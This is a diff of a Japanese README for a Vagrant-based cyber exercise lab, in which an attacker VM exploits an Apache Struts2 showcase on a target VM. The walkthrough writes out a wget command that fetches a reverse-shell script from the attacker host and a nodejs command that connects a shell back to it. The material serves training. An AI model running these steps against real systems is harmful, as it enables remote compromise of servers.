@@ -22,11 +22,13 @@ Attacker OSからTarget OSに設置されたApache Struts2が設置されたサ�
 ## Prerequisite
 * Vagrant
   * Plugin: landrush, vagrant-vbguest
+  * Packer
 
 ## Installation　　
 * Vagrant　　　
-1. $ vagrant up --provision　　　   
-2. $ vagrant landrush ls　　　   
+1. [CyExc用box](https://github.com/CyExc/CyExc/tree/master/2017/CyExc_Box)を作成する。
+2. $ vagrant up --provision　　　   
+3. $ vagrant landrush ls　　　   
 ゲストOSのIPアドレスとhostnameが以下のようにマッチしていない場合は、vagrant destroyを行う必要がある。
 ```  
 target.cyexc-target            192.168.33.10
@@ -34,24 +36,24 @@ target.cyexc-target            192.168.33.10
 attacker.cyexc-attacker        192.168.33.20
 20.33.168.192.in-addr.arpa     attacker.cyexc-attacker
 ```
-3. target側のOS起動 <br>
+4. target側のOS起動 <br>
 $ vagrant ssh target <br>
 	i. $ cd target/　<br>
 	ii.$ sudo docker-compose up --build <br>
 	iii. Browse to ht&#8203;tp://target.cyexc-target/struts2-showcase-2.3.12/index.action <br>
-4. attacker側のOS起動 <br>
+5. attacker側のOS起動 <br>
 $ vagrant ssh attacker <br>
 	i. $ cd attacker/  <br>
-	ii.$ sudo docker-compose up --build  <br> 
+	ii.$ sudo docker-compose up --build  <br>
 	iii. Browse to ht&#8203;tp://attacker.cyexc-attacker:8081/  <br>
 <br>
   <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/screenshot.png" width=250 title="Screenshot">
-  
+
   URLに`http://target.cyexc-target/struts2-showcase-2.3.12/index.action`と入力する。 <br>
   CMDはTarget OSで実行したいシェルコマンドを入力する。 <br>
-  Reverse Shellスクリプト`wget http://192.168.33.20:8081/reverseShellClient.js`と入力し、Attacker OSからTarget OSにダウンロードした。 
-  Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。 
-  以下はReverse ShellでTarget OSのシェルを取得した際のTerminalのスクリーンショット。 
+  Reverse Shellスクリプト`wget http://192.168.33.20:8081/reverseShellClient.js`と入力し、Attacker OSからTarget OSにダウンロードした。
+  Target OSからAttacker OSへの接続は`nodejs reverseShellClient.js -i 192.168.33.20`で行った。
+  以下はReverse ShellでTarget OSのシェルを取得した際のTerminalのスクリーンショット。
 
 <img src="https://github.com/CyExc/CyExc/blob/master/2017/ex1/images/reverseshell_terminal.png" width="400" title="スクリーンショット">
 
